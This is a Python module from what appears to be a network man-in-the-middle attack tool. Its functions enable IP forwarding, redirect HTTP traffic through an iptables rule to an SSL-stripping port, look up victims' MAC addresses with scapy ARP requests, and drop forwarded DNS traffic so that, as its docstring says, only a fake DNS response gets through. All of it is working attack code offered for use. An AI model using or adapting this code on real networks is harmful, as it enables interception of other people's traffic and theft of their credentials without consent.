import time
import os
import scapy.all as scapy
from . import STATUS, SSL_STRIP_PORT

def log_msg(message):
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    if len(STATUS["logs"]) > 50: STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    print(full_msg)

def set_ip_forwarding(value):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except: pass

def set_port_forwarding(enable):
    try:
        action = "-A" if enable else "-D"
        cmd = f"iptables -t nat {action} PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
        os.system(cmd)
        log_msg(f"[SYSTEM] IP Tables rule {'ADDED' if enable else 'REMOVED'} for SSL Strip.")
    except Exception as e:
        log_msg(f"[!] IP Tables Error: {e}")

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False, iface=STATUS["interface"])[0] 
        return answered_list[0][1].hwsrc if answered_list else None
    except: return None

def set_dns_blocking(enable):
    """ Blocks forwarded DNS traffic so ONLY our fake response gets through. """
    try:
        # We block traffic destined for UDP port 53 in the FORWARD chain
        rule = f"iptables -{{action}} FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
        
        if enable:
            os.system(rule.format(action="I")) # Insert rule
            log_msg("[SYSTEM] DNS Forwarding BLOCKED (Force Fake Response)")
        else:
            os.system(rule.format(action="D")) # Delete rule
            log_msg("[SYSTEM] DNS Forwarding Restored")
    except Exception as e:
        log_msg(f"[!] DNS Rules Error: {e}")